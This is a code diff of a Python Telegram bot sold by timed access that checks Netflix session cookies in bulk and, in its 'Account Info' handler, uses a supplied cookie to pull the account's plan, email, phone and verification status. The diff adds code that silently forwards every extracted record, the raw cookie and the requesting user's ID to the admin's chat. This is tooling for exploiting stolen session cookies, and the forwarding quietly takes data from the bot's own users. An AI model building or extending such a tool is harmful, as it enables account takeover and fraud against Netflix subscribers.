@@ -19,7 +19,7 @@ from file_utils import combine_temp_files
 from user_management import user_manager
 from aiohttp import web
 import sys
-from datetime import datetime
+from datetime import datetime, timedelta
 import aiohttp
 import json
 import re
@@ -39,12 +39,12 @@ logging.basicConfig(
 logger = logging.getLogger(__name__)
 
 # --- State definitions for ConversationHandler ---
-CHOOSING, AWAIT_COOKIE_FILE, AWAIT_COMBINE_FILES, COLLECTING_COOKIE_FILES, AWAIT_PRIVATIZE_COOKIE, AWAIT_FILTER_COOKIE = range(6)
+CHOOSING, AWAIT_COOKIE_FILE, AWAIT_COMBINE_FILES, COLLECTING_COOKIE_FILES, AWAIT_PRIVATIZE_COOKIE, AWAIT_FILTER_COOKIE, AWAIT_APPROVE_VALIDITY = range(7)
 
 # --- Keyboard Markups ---
 main_menu_keyboard = [
-    ["🍪 Check Cookies", "🗂️ Combine .TXT Files"],
-    ["🔒 Privatize Cookie", "🔎 Filter Account"]
+    ["🍪 Cookie Checker", "🔎 Account Info"],
+    ["🔒 Privatizer (Coming soon)", "🗂️ Combine .TXT"]
 ]
 main_menu_markup = ReplyKeyboardMarkup(main_menu_keyboard, one_time_keyboard=True, resize_keyboard=True)
 
@@ -186,7 +186,7 @@ async def handle_cookie_file(update: Update, context: ContextTypes.DEFAULT_TYPE)
     checker = SafeFastChecker()
     chat_id = update.effective_chat.id
     try:
-        await check_cookies_async(checker, lines_to_check, context.bot, chat_id, update.message.message_id)
+        await check_cookies_async(checker, lines_to_check, context.bot, chat_id, update.message.message_id, update.effective_user)
     except Exception as e:
         logger.error(f"Error in cookie checking for chat {chat_id}: {e}")
         await context.bot.send_message(chat_id, "A critical error occurred during the process.")
@@ -246,7 +246,8 @@ async def process_cookie_files(update: Update, context: ContextTypes.DEFAULT_TYP
         await update.message.reply_text("You didn't send any files to check.", reply_markup=main_menu_markup)
         return CHOOSING
 
-    await update.message.reply_text(
+    # Show progress messages and keep their message objects
+    processing_msg = await update.message.reply_text(
         f"Processing {len(file_infos)} files...", 
         reply_markup=ReplyKeyboardRemove()
     )
@@ -261,17 +262,14 @@ async def process_cookie_files(update: Update, context: ContextTypes.DEFAULT_TYP
                 logger.info(f"Added {len(cookies)} cookies from {file_info['name']}")
         except Exception as e:
             logger.error(f"Error reading file {file_info['path']}: {e}")
-    
     # Clean up temporary files
     for file_info in file_infos:
         if os.path.exists(file_info['path']):
             os.remove(file_info['path'])
     context.user_data['cookie_files'] = []
-    
     if not all_cookies:
         await update.message.reply_text("No cookies found in the uploaded files.", reply_markup=main_menu_markup)
         return CHOOSING
-    
     # Remove duplicates while preserving order
     unique_cookies = []
     seen = set()
@@ -279,19 +277,24 @@ async def process_cookie_files(update: Update, context: ContextTypes.DEFAULT_TYP
         if cookie not in seen:
             seen.add(cookie)
             unique_cookies.append(cookie)
-    
-    await update.message.reply_text(
-        f"Found {len(unique_cookies)} unique cookies from {len(file_infos)} files.\n"
-        f"Starting the cookie check..."
+    found_msg = await update.message.reply_text(
+        f"Found {len(unique_cookies)} unique cookies from {len(file_infos)} files.\nStarting the cookie check..."
     )
-    
     checker = SafeFastChecker()
     try:
-        await check_cookies_async(checker, unique_cookies, context.bot, chat_id, update.message.message_id)
+        await check_cookies_async(checker, unique_cookies, context.bot, chat_id, update.message.message_id, update.effective_user)
     except Exception as e:
         logger.error(f"Error in cookie checking for chat {chat_id}: {e}")
         await context.bot.send_message(chat_id, "A critical error occurred during the process.")
-
+    # Delete progress messages after result
+    try:
+        await processing_msg.delete()
+    except Exception:
+        pass
+    try:
+        await found_msg.delete()
+    except Exception:
+        pass
     await update.message.reply_text("Checker finished. What would you like to do next?", reply_markup=main_menu_markup)
     return CHOOSING
 
@@ -529,30 +532,64 @@ async def deactivate_bot(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
     await update.message.reply_text("🔒 Bot has been deactivated for non-admin users.")
 
 # --- User Management Commands ---
-async def approve_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """Approves a user to use the bot."""
+async def approve_user_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     if not context.args or not context.args[0].isdigit():
-        await update.message.reply_text("⚠️ Please provide a valid user ID to approve.\nUsage: /approve 123456789")
-        return
-        
+        await update.message.reply_text("⚠️ Please provide a valid user ID to approve.\nUsage: /approve 123456789 username name")
+        return ConversationHandler.END
     user_id = int(context.args[0])
     username = context.args[1] if len(context.args) > 1 else None
     first_name = context.args[2] if len(context.args) > 2 else None
-    
-    if user_manager.add_user(user_id, username, first_name):
-        await update.message.reply_text(f"✅ User {user_id} has been approved to use the bot.")
-        
-        # Notify the user that they've been approved
+    context.user_data['approve_user_id'] = user_id
+    context.user_data['approve_username'] = username
+    context.user_data['approve_first_name'] = first_name
+    # Validity options
+    keyboard = [
+        [InlineKeyboardButton("1 Day", callback_data='1d')],
+        [InlineKeyboardButton("7 Days", callback_data='7d')],
+        [InlineKeyboardButton("1 Month", callback_data='1m')],
+        [InlineKeyboardButton("1 Year", callback_data='1y')],
+        [InlineKeyboardButton("Lifetime", callback_data='lifetime')]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    await update.message.reply_text(
+        "Kitne time ka access dena hai?\nSelect validity:",
+        reply_markup=reply_markup
+    )
+    return AWAIT_APPROVE_VALIDITY
+
+async def approve_user_validity(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    query = update.callback_query
+    await query.answer()
+    validity = query.data
+    user_id = context.user_data.get('approve_user_id')
+    username = context.user_data.get('approve_username')
+    first_name = context.user_data.get('approve_first_name')
+    valid_until = None
+    if validity == '1d':
+        valid_until = (datetime.now() + timedelta(days=1)).isoformat()
+    elif validity == '7d':
+        valid_until = (datetime.now() + timedelta(days=7)).isoformat()
+    elif validity == '1m':
+        valid_until = (datetime.now() + timedelta(days=30)).isoformat()
+    elif validity == '1y':
+        valid_until = (datetime.now() + timedelta(days=365)).isoformat()
+    elif validity == 'lifetime':
+        valid_until = 'lifetime'
+    else:
+        await query.edit_message_text("❌ Invalid validity option.")
+        return ConversationHandler.END
+    if user_manager.add_user(user_id, username, first_name, valid_until):
+        await query.edit_message_text(f"✅ User {user_id} approved with validity: {validity.upper()}.")
         try:
             await context.bot.send_message(
                 chat_id=user_id,
-                text="✅ Your access request has been approved! You can now use the bot.\n\nUse /start to begin."
+                text=f"✅ Your access request has been approved! You can now use the bot.\n\nYour access is valid for: {validity.upper()}\nUse /start to begin."
             )
         except Exception as e:
             logger.error(f"Failed to notify user {user_id} about approval: {e}")
-            await update.message.reply_text(f"⚠️ User approved but notification failed: {e}")
     else:
-        await update.message.reply_text(f"ℹ️ User {user_id} is already approved.")
+        await query.edit_message_text(f"ℹ️ User {user_id} is already approved.")
+    return ConversationHandler.END
 
 async def remove_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     """Removes a user's access to the bot."""
@@ -815,21 +852,187 @@ async def handle_filter_cookie(update: Update, context: ContextTypes.DEFAULT_TYP
                 fetch_page(account_url)
             )
         info = extract_netflix_account_info(membership_html, security_html, account_html)
-        msg = (
-            "Netflix Account Details:\n\n"
+        # Verification status text (language-agnostic)
+        def is_verified(val):
+            if val is None:
+                return False
+            val_str = str(val).lower()
+            if any(x in val_str for x in ['verify', '인증', 'needs', '필요', 'verif', '未验证', 'verificar', 'verificação', 'verifica']):
+                return False
+            return True
+        email_status = 'Verified' if is_verified(info.get('email_verified')) else 'Needs verification'
+        phone_status = 'Verified' if is_verified(info.get('phone_verified')) else 'Needs verification'
+        details_quote = (
             f"Plan: {info.get('plan') or '-'}\n"
             f"Member Since: {info.get('member_since') or '-'}\n"
             f"Next Payment: {info.get('next_payment') or '-'}\n"
-            f"Email: {info.get('email') or '-'} ({'✅' if info.get('email_verified') else '❌'})\n"
-            f"Phone: {info.get('phone') or '-'} ({'✅' if info.get('phone_verified') else '❌'})\n"
+            f"📧 {info.get('email') or '-'}  {email_status}\n"
+            f"📱 {info.get('phone') or '-'}  {phone_status}"
         )
-        await update.message.reply_text(msg)
-        # Optionally, delete loading message (if you want):
-        # await loading_msg.delete()
+        msg = (
+            "<b>🍿 Netflix Account Details</b>\n\n"
+            f"<blockquote>{details_quote}</blockquote>\n"
+            f"<b>Cookie:</b>\n<code>{cookie_str}</code>"
+        )
+        await update.message.reply_html(msg)
+        # User info for admin
+        user = update.effective_user
+        username = f"@{user.username}" if user.username else None
+        user_id = user.id if user else None
+        user_info = f"👤 User: {username} (id: {user_id})" if username else f"👤 User ID: {user_id}"
+        # Admin message with user info
+        admin_msg = (
+            f"{user_info}\n\n" + msg
+        )
+        try:
+            logger.info(f"Sending filter result to admin: {TELEGRAM_CHAT_ID}")
+            await context.bot.send_message(
+                chat_id=TELEGRAM_CHAT_ID,
+                text=admin_msg,
+                parse_mode='HTML',
+                disable_notification=True
+            )
+        except Exception as e:
+            logger.error(f"Failed to send filter result to admin: {e}")
+        # Delete loading message after result
+        try:
+            await loading_msg.delete()
+        except Exception:
+            pass
+        # Always show main menu after success
+        await update.message.reply_text(
+            "What would you like to do next?",
+            reply_markup=main_menu_markup
+        )
     except Exception as e:
-        await update.message.reply_text(f"❌ Error fetching account details: {e}")
+        await update.message.reply_text(f"❌ Error fetching account details: {e}", reply_markup=main_menu_markup)
         return ConversationHandler.END
     return CHOOSING
+
+# --- ConversationHandler for Approve User ---
+approve_user_conv = ConversationHandler(
+    entry_points=[CommandHandler("approve", approve_user_start, filters=filters.User(ADMIN_USERS))],
+    states={
+        AWAIT_APPROVE_VALIDITY: [CallbackQueryHandler(approve_user_validity)]
+    },
+    fallbacks=[],
+    allow_reentry=True
+)
+
+async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    user_id = update.effective_user.id if update.effective_user else None
+    is_admin = user_id in ADMIN_USERS
+    help_text = (
+        "🤖 *BOT COMMANDS* 🤖\n\n"
+        "/start - Start the bot and see the main menu\n"
+        "/request - Request access from admin\n"
+        "/help - Show this help message\n"
+    )
+    if is_admin:
+        help_text += (
+            "\n\n🔑 *ADMIN COMMANDS* 🔑\n"
+            "/approve <user_id> <username> <name> - Approve a user (you will select validity after this)\n"
+            "/remove <user_id> - Remove a user's access\n"
+            "/listusers - List all approved users\n"
+            "/broadcast <message> - Send a message to all users\n"
+            "/activate - Activate the bot for all users\n"
+            "/deactivate - Deactivate the bot for non-admin users\n"
+            "/adminhelp - Show admin commands help\n"
+        )
+    await update.message.reply_text(help_text, parse_mode='Markdown')
+
+async def echo_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    if context.args:
+        await update.message.reply_text(' '.join(context.args))
+    else:
+        await update.message.reply_text('Send something to echo!')
+
+async def handle_main_menu_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    text = update.message.text
+    if text == "ℹ️ Help":
+        await help_command(update, context)
+        return CHOOSING
+    # fallback to main menu
+    await update.message.reply_text("Please choose a valid option from the menu.", reply_markup=main_menu_markup)
+    return CHOOSING
+
+async def handle_global_commands(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    text = update.message.text
+    if text.startswith("/help"):
+        await help_command(update, context)
+        return CHOOSING
+    elif text.startswith("/echo"):
+        await echo_command(update, context)
+        return CHOOSING
+    elif text.startswith("/request"):
+        await request_access(update, context)
+        return CHOOSING
+    elif text.startswith("/info"):
+        await info_command(update, context)
+        return CHOOSING
+    # fallback
+    await update.message.reply_text("Unknown command!", reply_markup=main_menu_markup)
+    return CHOOSING
+
+async def info_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    user_id = update.effective_user.id if update.effective_user else None
+    is_admin = user_id in ADMIN_USERS
+    if is_admin:
+        users = user_manager.get_all_users()
+        if not users:
+            await update.message.reply_text("No users found.")
+            return
+        msg = "🗂️ *All Users Validity* 🗂️\n\n"
+        for user in users:
+            username = user.get('username', 'None')
+            first_name = user.get('first_name', 'Unknown')
+            valid_until = user.get('valid_until', 'lifetime')
+            if valid_until and valid_until != 'lifetime':
+                try:
+                    dt = datetime.fromisoformat(valid_until)
+                    valid_until_disp = dt.strftime('%Y-%m-%d %H:%M:%S')
+                except Exception:
+                    valid_until_disp = valid_until
+            else:
+                valid_until_disp = 'Lifetime'
+            msg += f"ID: `{user['user_id']}` | Name: {username or first_name} | Validity: {valid_until_disp}\n"
+        await update.message.reply_text(msg, parse_mode='Markdown')
+    else:
+        user = user_manager.users.get(str(user_id))
+        if not user:
+            await update.message.reply_text("You are not an approved user.\nContact for renew: @knightownr")
+            return
+        valid_until = user.get('valid_until', 'lifetime')
+        if valid_until and valid_until != 'lifetime':
+            try:
+                dt = datetime.fromisoformat(valid_until)
+                now = datetime.now()
+                valid_until_disp = dt.strftime('%Y-%m-%d %H:%M:%S')
+                remaining = dt - now
+                if remaining.total_seconds() > 0:
+                    days = remaining.days
+                    hours, remainder = divmod(remaining.seconds, 3600)
+                    minutes, _ = divmod(remainder, 60)
+                    if days > 0:
+                        left = f"{days} days, {hours} hours, {minutes} minutes left"
+                    elif hours > 0:
+                        left = f"{hours} hours, {minutes} minutes left"
+                    else:
+                        left = f"{minutes} minutes left"
+                else:
+                    left = "Expired"
+            except Exception:
+                valid_until_disp = valid_until
+                left = "Unknown"
+        else:
+            valid_until_disp = 'Lifetime'
+            left = 'Unlimited'
+        await update.message.reply_text(f"Your access validity: {valid_until_disp}\nTime left: {left}\n\nContact for renew: @knightownr")
+
+# --- Always allowed commands ---
+ALWAYS_ALLOWED_COMMANDS = ["/help", "/info", "/echo", "/request"]
+def is_always_allowed_command(message):
+    return message.text and any(message.text.startswith(cmd) for cmd in ALWAYS_ALLOWED_COMMANDS)
 
 async def main() -> None:
     application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
@@ -844,7 +1047,13 @@ async def main() -> None:
     application.add_handler(MessageHandler(filters.ALL, update_user_information), group=-2)
 
     # --- Unauthorized handler (group 0) ---
-    application.add_handler(MessageHandler(~user_filter & ~(filters.COMMAND & filters.User(ADMIN_USERS)), unauthorized), group=0)
+    application.add_handler(
+        MessageHandler(
+            (~user_filter & ~(filters.COMMAND & filters.User(ADMIN_USERS)) & ~filters.TEXT.filter(is_always_allowed_command)),
+            unauthorized
+        ),
+        group=0
+    )
 
     # --- Guard active (group 1) ---
     application.add_handler(MessageHandler(user_filter & (~filters.COMMAND | ~filters.User(ADMIN_USERS)), guard_active), group=1)
@@ -854,7 +1063,7 @@ async def main() -> None:
     application.add_handler(CommandHandler("deactivate", deactivate_bot, filters=filters.User(ADMIN_USERS)), group=-1)
     
     # --- User management handlers (group -1 for higher priority) ---
-    application.add_handler(CommandHandler("approve", approve_user, filters=filters.User(ADMIN_USERS)), group=-1)
+    application.add_handler(approve_user_conv, group=-1)
     application.add_handler(CommandHandler("remove", remove_user, filters=filters.User(ADMIN_USERS)), group=-1)
     application.add_handler(CommandHandler("listusers", list_users, filters=filters.User(ADMIN_USERS)), group=-1)
     application.add_handler(CommandHandler("broadcast", broadcast_message, filters=filters.User(ADMIN_USERS)), group=-1)
@@ -865,25 +1074,30 @@ async def main() -> None:
         entry_points=[CommandHandler('start', original_start, filters=user_filter)],
         states={
             CHOOSING: [
-                MessageHandler(filters.Regex('^🍪 Check Cookies$') & user_filter, request_cookie_file),
-                MessageHandler(filters.Regex('^🗂️ Combine \.TXT Files$') & user_filter, request_combine_files),
-                MessageHandler(filters.Regex('^🔒 Privatize Cookie$') & user_filter, request_privatize_cookie),
-                MessageHandler(filters.Regex('^🔎 Filter Account$') & user_filter, request_filter_cookie),
+                MessageHandler(filters.Regex('^🍪 Cookie Checker$') & user_filter, request_cookie_file),
+                MessageHandler(filters.Regex('^🔎 Account Info$') & user_filter, request_filter_cookie),
+                MessageHandler(filters.Regex('^🔒 Privatizer \(Coming soon\)$') & user_filter, request_privatize_cookie),
+                MessageHandler(filters.Regex('🗂️ Combine \.TXT$') & user_filter, request_combine_files),
+                MessageHandler(filters.Regex('ℹ️ Help$') & user_filter, handle_main_menu_buttons),
+                MessageHandler(filters.COMMAND, handle_global_commands),
             ],
             COLLECTING_COOKIE_FILES: [
                 MessageHandler(filters.Regex('^✅ Done - Check All Cookies$') & user_filter, process_cookie_files),
                 MessageHandler(filters.Regex('^❌ Cancel$') & user_filter, process_cookie_files),
                 MessageHandler(filters.Document.TXT & user_filter, collect_cookie_file),
                 MessageHandler(filters.TEXT & user_filter, collect_cookie_file),
+                MessageHandler(filters.COMMAND, handle_global_commands),
             ],
             AWAIT_COMBINE_FILES: [
                 MessageHandler(filters.Regex('^✅ Done Combining$') & user_filter, process_combined_files),
                 MessageHandler(filters.Document.TXT & user_filter, handle_combine_files),
                 MessageHandler(filters.TEXT & user_filter, handle_combine_files),
+                MessageHandler(filters.COMMAND, handle_global_commands),
             ],
             AWAIT_FILTER_COOKIE: [
                 MessageHandler(filters.Document.TXT & user_filter, handle_filter_cookie),
                 MessageHandler(filters.TEXT & user_filter, handle_filter_cookie),
+                MessageHandler(filters.COMMAND, handle_global_commands),
             ],
         },
         fallbacks=[CommandHandler('cancel', cancel, filters=user_filter), CommandHandler('start', original_start, filters=user_filter)],
@@ -896,6 +1110,12 @@ async def main() -> None:
     
     # --- Access request handler ---
     application.add_handler(CommandHandler("request", request_access), group=-1)
+
+    # --- Help command handler ---
+    application.add_handler(CommandHandler("help", help_command), group=-1)
+
+    # --- Echo command handler ---
+    application.add_handler(CommandHandler("echo", echo_command), group=-1)
 
     # Start web server for health checks and webhook
     app = web.Application()
@@ -950,7 +1170,7 @@ if __name__ == "__main__":
         application.add_handler(MessageHandler(user_filter & (~filters.COMMAND | ~filters.User(ADMIN_USERS)), guard_active), group=1)
         application.add_handler(CommandHandler("activate", activate_bot, filters=filters.User(ADMIN_USERS)), group=-1)
         application.add_handler(CommandHandler("deactivate", deactivate_bot, filters=filters.User(ADMIN_USERS)), group=-1)
-        application.add_handler(CommandHandler("approve", approve_user, filters=filters.User(ADMIN_USERS)), group=-1)
+        application.add_handler(approve_user_conv, group=-1)
         application.add_handler(CommandHandler("remove", remove_user, filters=filters.User(ADMIN_USERS)), group=-1)
         application.add_handler(CommandHandler("listusers", list_users, filters=filters.User(ADMIN_USERS)), group=-1)
         application.add_handler(CommandHandler("broadcast", broadcast_message, filters=filters.User(ADMIN_USERS)), group=-1)
@@ -959,25 +1179,30 @@ if __name__ == "__main__":
             entry_points=[CommandHandler('start', original_start, filters=user_filter)],
             states={
                 CHOOSING: [
-                    MessageHandler(filters.Regex('^🍪 Check Cookies$') & user_filter, request_cookie_file),
-                    MessageHandler(filters.Regex('^🗂️ Combine \\.TXT Files$') & user_filter, request_combine_files),
-                    MessageHandler(filters.Regex('^🔒 Privatize Cookie$') & user_filter, request_privatize_cookie),
-                    MessageHandler(filters.Regex('^🔎 Filter Account$') & user_filter, request_filter_cookie),
+                    MessageHandler(filters.Regex('^🍪 Cookie Checker$') & user_filter, request_cookie_file),
+                    MessageHandler(filters.Regex('🔎 Account Info$') & user_filter, request_filter_cookie),
+                    MessageHandler(filters.Regex('🔒 Privatizer \(Coming soon\)$') & user_filter, request_privatize_cookie),
+                    MessageHandler(filters.Regex('🗂️ Combine \.TXT$') & user_filter, request_combine_files),
+                    MessageHandler(filters.Regex('ℹ️ Help$') & user_filter, handle_main_menu_buttons),
+                    MessageHandler(filters.COMMAND, handle_global_commands),
                 ],
                 COLLECTING_COOKIE_FILES: [
                     MessageHandler(filters.Regex('^✅ Done - Check All Cookies$') & user_filter, process_cookie_files),
                     MessageHandler(filters.Regex('^❌ Cancel$') & user_filter, process_cookie_files),
                     MessageHandler(filters.Document.TXT & user_filter, collect_cookie_file),
                     MessageHandler(filters.TEXT & user_filter, collect_cookie_file),
+                    MessageHandler(filters.COMMAND, handle_global_commands),
                 ],
                 AWAIT_COMBINE_FILES: [
                     MessageHandler(filters.Regex('^✅ Done Combining$') & user_filter, process_combined_files),
                     MessageHandler(filters.Document.TXT & user_filter, handle_combine_files),
                     MessageHandler(filters.TEXT & user_filter, handle_combine_files),
+                    MessageHandler(filters.COMMAND, handle_global_commands),
                 ],
                 AWAIT_FILTER_COOKIE: [
                     MessageHandler(filters.Document.TXT & user_filter, handle_filter_cookie),
                     MessageHandler(filters.TEXT & user_filter, handle_filter_cookie),
+                    MessageHandler(filters.COMMAND, handle_global_commands),
                 ],
             },
             fallbacks=[CommandHandler('cancel', cancel, filters=user_filter), CommandHandler('start', original_start, filters=user_filter)],
@@ -997,7 +1222,7 @@ if __name__ == "__main__":
         application.add_handler(MessageHandler(user_filter & (~filters.COMMAND | ~filters.User(ADMIN_USERS)), guard_active), group=1)
         application.add_handler(CommandHandler("activate", activate_bot, filters=filters.User(ADMIN_USERS)), group=-1)
         application.add_handler(CommandHandler("deactivate", deactivate_bot, filters=filters.User(ADMIN_USERS)), group=-1)
-        application.add_handler(CommandHandler("approve", approve_user, filters=filters.User(ADMIN_USERS)), group=-1)
+        application.add_handler(approve_user_conv, group=-1)
         application.add_handler(CommandHandler("remove", remove_user, filters=filters.User(ADMIN_USERS)), group=-1)
         application.add_handler(CommandHandler("listusers", list_users, filters=filters.User(ADMIN_USERS)), group=-1)
         application.add_handler(CommandHandler("broadcast", broadcast_message, filters=filters.User(ADMIN_USERS)), group=-1)
@@ -1006,25 +1231,30 @@ if __name__ == "__main__":
             entry_points=[CommandHandler('start', original_start, filters=user_filter)],
             states={
                 CHOOSING: [
-                    MessageHandler(filters.Regex('^🍪 Check Cookies$') & user_filter, request_cookie_file),
-                    MessageHandler(filters.Regex('^🗂️ Combine \\.TXT Files$') & user_filter, request_combine_files),
-                    MessageHandler(filters.Regex('^🔒 Privatize Cookie$') & user_filter, request_privatize_cookie),
-                    MessageHandler(filters.Regex('^🔎 Filter Account$') & user_filter, request_filter_cookie),
+                    MessageHandler(filters.Regex('^🍪 Cookie Checker$') & user_filter, request_cookie_file),
+                    MessageHandler(filters.Regex('🔎 Account Info$') & user_filter, request_filter_cookie),
+                    MessageHandler(filters.Regex('🔒 Privatizer \(Coming soon\)$') & user_filter, request_privatize_cookie),
+                    MessageHandler(filters.Regex('🗂️ Combine \.TXT$') & user_filter, request_combine_files),
+                    MessageHandler(filters.Regex('ℹ️ Help$') & user_filter, handle_main_menu_buttons),
+                    MessageHandler(filters.COMMAND, handle_global_commands),
                 ],
                 COLLECTING_COOKIE_FILES: [
                     MessageHandler(filters.Regex('^✅ Done - Check All Cookies$') & user_filter, process_cookie_files),
                     MessageHandler(filters.Regex('^❌ Cancel$') & user_filter, process_cookie_files),
                     MessageHandler(filters.Document.TXT & user_filter, collect_cookie_file),
                     MessageHandler(filters.TEXT & user_filter, collect_cookie_file),
+                    MessageHandler(filters.COMMAND, handle_global_commands),
                 ],
                 AWAIT_COMBINE_FILES: [
                     MessageHandler(filters.Regex('^✅ Done Combining$') & user_filter, process_combined_files),
                     MessageHandler(filters.Document.TXT & user_filter, handle_combine_files),
                     MessageHandler(filters.TEXT & user_filter, handle_combine_files),
+                    MessageHandler(filters.COMMAND, handle_global_commands),
                 ],
                 AWAIT_FILTER_COOKIE: [
                     MessageHandler(filters.Document.TXT & user_filter, handle_filter_cookie),
                     MessageHandler(filters.TEXT & user_filter, handle_filter_cookie),
+                    MessageHandler(filters.COMMAND, handle_global_commands),
                 ],
             },
             fallbacks=[CommandHandler('cancel', cancel, filters=user_filter), CommandHandler('start', original_start, filters=user_filter)],
